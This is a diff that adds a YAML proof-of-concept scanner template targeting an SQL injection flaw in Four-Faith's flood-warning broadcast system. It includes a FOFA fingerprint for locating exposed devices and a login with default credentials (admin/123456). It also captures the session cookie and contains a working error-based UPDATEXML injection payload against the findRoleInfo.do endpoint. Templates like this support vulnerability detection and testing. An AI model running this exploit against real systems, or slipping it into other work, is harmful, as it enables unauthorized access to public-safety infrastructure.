@@ -1,0 +1,29 @@
+id: poc-yaml-four-faith-fdwbs-findroleinfo-do-sqli
+info:
+  name: 四信通信泄洪预警广播系统 findRoleInfo.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 四信通信泄洪预警广播系统
+  fofa: icon_hash="-30177135"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /userLogin.do
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: userName=admin&userPwd=123456
+  expression: status_code == 200 && contains(body,"true")
+  output:
+  - regex_match(headers,"JSESSIONID=(?P<cookie>.*?);")
+- method: POST
+  path: /roleInfo/findRoleInfo.do
+  headers:
+    Cookie: JSESSIONID={{.cookie}}
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: name=%25%27+OR+UPDATEXML%283975%2CCONCAT%280x2e%2Cmd5({{.t1}})%2C%28SELECT+%28ELT%283975%3D3975%2C1%29%29%29%2C0x716a706a71%29%2C3853%29+AND+%27fEDT%25%27%3D%27fEDT&rows=10&page=1
+  expression: status_code == 200 && contains(body,t2) && contains(body,"XPATH") &&
+    contains(body,"syntax") && contains(body,"error")
+transport: http
